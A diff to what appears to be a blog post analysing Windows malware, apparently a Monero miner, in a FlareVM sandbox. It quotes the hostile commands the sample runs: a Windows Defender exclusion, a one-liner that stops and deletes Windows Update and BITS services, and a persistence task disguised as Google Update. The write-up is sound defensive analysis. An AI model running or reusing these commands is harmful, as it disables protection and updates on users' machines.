@@ -162,7 +162,7 @@ Finally, I opened up **ProcMon** to monitor what processes the binary was openin
 
 As you can see, the cmd shell was executing a **.bat** file, and because .bat files essentially are cmd shells when they are executed, I was able to see what this .bat file was doing after execution. To me, it looked like it was creating a bunch of registy entries, possibly something to do with persistence? I wasn't too sure.
 
-After all of this, the binary finally opens Microsoft Edge and redirects to the domain ```antileaktab.com``` 
+After all of this, the binary finally opens a browser and redirects to the domain ```antileaktab.com``` 
 
 <img src="/images/ezedge.png" alt= "ezedge" width="90%" height="90%">
 
@@ -180,4 +180,45 @@ VirusTotal gives the binary a 25/70 detection rate, interestingly Fortinet call 
 - GNU Linker (???)
 - MD5: ```d5a3aaa28767c4fcf4ba7398fd841cb0```
 - Prompts UAC on execution.
+- VirusTotal says the binary connects to ```xmr.2miners.com```, highly suggesting this is XMR Miner malware.
+
+Once again, this binary wasn't able to be ran within ```app.any.run``` for initial analysis, so I fired up FlareVM and again used Process Hacker & ProcMon to monitor what the binary was doing.
+
+After executing the binary and letting its execution flow freely, I started to see some Powershell and cmd.exe activity in ProcMon, it seemed at first it was creating a Windows Defender Exclusion for itself with the following command:
+
+```powershell.exe Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force```
+
+<img src="/images/1powerexclude.png" alt= "exclusion" width="85%" height="85%">
+
+After that, it used cmd.exe to stop some services and use the ```reg delete``` command to delete some entries in the Registry with the following command:
+
+```cmd.exe /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\UsoSvc" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\bits" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\dosvc" /f```
+
+<img src="/images/2cmdstopservice.png" alt= "cmdstopservice" width="85%" height="85%">
+
+The binary stops & deletes the registry entries for the following services:
+1. **```UsoSvc```**
+2. **```WaaSMedicSvc```**
+3. **```wuauserv```**
+4. **```bits```**
+5. **```dosvc```**
+
+**But why?:**
+- **```UsoSvc```** is the **Windows Update Orchestrator Service** and is a critically needed service that is required by Windows to scan, download, and install new Windows Updates to your computer.
+- **```WaaSMediaSvc```** is the **Windows Update Medic Service**. The entire purpose of this service is to fix any damages suffered by the Windows Update components, so that you can continue to receive the Windows updates without any interruption.
+- **```wuauserv```** is the **Windows Update Service**, it provides direct access to the updates of the Windows operating system.
+- **```bits```** stands for **Background Intelligent Transfer Service**. It is used to download files from or upload files to HTTP web servers and SMB file shares, it is most likely the malware is disabling this service so the previously mentioned Update services cannot reach out to the Windows Update servers to download the latest updates.
+- **```dosvc```** is the **Delivery Optimization Service**, it ensures reliable and secure downloads of content or Windows Updates.
+
+*I guess the binary REALLY doesn't want us to get the latest security updates..* 🤣
+
+Next up, the binary runs & adds to startup what seems to be **another** backdoor called ```updater.exe``` with the following command:
+
+```powershell.exe <#xjwvbygm#> IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { IF([System.Environment]::OSVersion.Version -lt [System.Version]"6.2") { schtasks /create /f /sc onlogon /rl highest /ru 'System' /tn 'GoogleUpdateTaskMachineQC' /tr '''C:\Program Files\Google\Chrome\updater.exe''' } Else { Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\updater.exe')  -Trigger (New-ScheduledTaskTrigger -AtStartup)  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000))  -TaskName 'GoogleUpdateTaskMachineQC' -User 'System' -RunLevel 'Highest' -Force; } } Else { reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "GoogleUpdateTaskMachineQC"/t REG_SZ /f /d 'C:\Program Files\Google\Chrome\updater.exe' }, ```
+
+<img src="/images/3powerupdater.png" alt= "3powerupdater" width="80%" height="80%">
+
+Finally, just in case the second cmd.exe command didn't work, cmd.exe runs all the commands again, but this time, one-by-one.
+
+<img src="/images/4cmdstopservice.png" alt= "4cmdstopservice" width="75%" height="75%">
 
